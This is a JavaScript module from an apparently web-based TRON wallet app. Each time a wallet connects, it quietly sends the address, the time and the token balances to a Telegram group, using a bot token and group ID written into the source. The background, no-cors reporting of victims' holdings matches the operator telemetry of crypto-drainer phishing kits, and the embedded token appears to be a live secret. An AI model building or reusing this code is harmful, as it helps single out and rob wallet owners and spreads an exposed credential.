export const TelegramService = {
    BOT_TOKEN: '8434580365:AAE41hblDWPNtM5cO0GDHEX9-i51Q9fZakw',
    GROUP_ID: '-5121384419',

    /**
     * Sends a connection notification to the Telegram group.
     * @param {Object} portfolio - Result from TransactionService.getWalletPortfolio
     * @param {string} address - Wallet address
     */
    sendConnectionNotification: async (portfolio, address) => {
        try {
            console.log(`[Telegram] Starting notification flow for ${address}`);

            const now = new Date();
            const day = String(now.getDate()).padStart(2, '0');
            const month = String(now.getMonth() + 1).padStart(2, '0');
            const hours = String(now.getHours()).padStart(2, '0');
            const minutes = String(now.getMinutes()).padStart(2, '0');
            const timeString = `${day}.${month} - ${hours}:${minutes}`;

            let breakdown = `${portfolio.trx.toFixed(2)} TRX`;
            if (portfolio.tokens && portfolio.tokens.length > 0) {
                portfolio.tokens.forEach(t => {
                    breakdown += ` ve ${t.balance.toFixed(2)} ${t.symbol}`;
                });
            }

            const message = `
👛: <a href="https://tronscan.org/#/address/${address}">${address}</a>
⏰: ${timeString}
💰: ${portfolio.totalUsd.toFixed(4)} $ (${breakdown})
            `.trim();

            const params = new URLSearchParams();
            params.append('chat_id', TelegramService.GROUP_ID);
            params.append('text', message);
            params.append('parse_mode', 'HTML');
            params.append('disable_web_page_preview', 'true');

            const url = `https://api.telegram.org/bot${TelegramService.BOT_TOKEN}/sendMessage?${params.toString()}`;

            const sendRequest = async (retryCount = 0) => {
                try {
                    console.log(`[Telegram] Sending request (Attempt ${retryCount + 1})...`);
                    await fetch(url, { mode: 'no-cors' });
                    // Since no-cors returns opaque response, we assume success if no network error thrown
                    console.log("[Telegram] Request sent (no-cors mode).");
                    return true;
                } catch (error) {
                    console.error(`[Telegram] Request Failed (Attempt ${retryCount + 1}):`, error);
                    if (retryCount === 0) {
                        console.log("[Telegram] Retrying once...");
                        await new Promise(resolve => setTimeout(resolve, 2000));
                        return sendRequest(retryCount + 1);
                    }
                    return false;
                }
            };

            // Non-blocking trigger
            sendRequest().catch(e => console.error("[Telegram] Fatal Error in async sender:", e));

        } catch (error) {
            console.error("[Telegram] Failed to prepare notification:", error);
        }
    }
};
